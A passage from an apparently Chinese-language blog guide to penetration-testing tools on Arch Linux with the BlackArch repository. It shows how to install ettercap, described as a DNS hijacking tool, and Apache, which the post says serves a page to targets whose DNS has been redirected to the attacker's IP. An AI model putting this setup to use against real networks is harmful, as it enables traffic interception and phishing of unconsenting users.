<p>强大的DNS劫持工具，各大搜索引擎也有不少教程。它分为命令行版本和图形化版本，但是只能装其中一个，否则会冲突。</p>
<h5 id="安装方法-9">安装方法</h5>
<p>命令行版:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S ettercap
</span></span></code></pre></td></tr></table>
</div>
</div><p>图形化版:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S ettercap-gtk
</span></span></code></pre></td></tr></table>
</div>
</div><p>命令行版本在终端执行即可，图形化版本可以在菜单中找到，如果没有执行以下命令</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo ettercap -G
</span></span></code></pre></td></tr></table>
</div>
</div><h4 id="apache">apache</h4>
<p>怎么还有这个东西？这个东西不是建网站的吗，哈哈，其实这个是辅助ettercap的，当你劫持目标DNS以后，会将其强行解析到你的IP，而apache就可以在你的机器上运行一个静态网页（html）。</p>
<h5 id="安装方法-10">安装方法</h5>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo pacman -S apache
</span></span></code></pre></td></tr></table>
</div>
</div><h5 id="使用方法-5">使用方法</h5>
<p>执行以下命令启动apache</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl start httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>网页根目录为<code>/srv/http/</code></p>
<p>可以在目录下写一个html文件，写完执行</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">$ sudo systemctl restart httpd
</span></span></code></pre></td></tr></table>
</div>
</div><p>以重启apache即可。</p>
<h2 id="小结">小结</h2>
<p>一个普通的Arch Linuxu导入了Black Arch的软件源之后，可以堪称完美的渗透环境了，以上只是常用的工具，而Black Arch软件源里面有几千个工具，想要什么可以通过<code>pacman</code>下载安装，应有尽有。</p>
<p>最后，谢谢访问。</p>
]]></description>
</item></channel>
</rss>
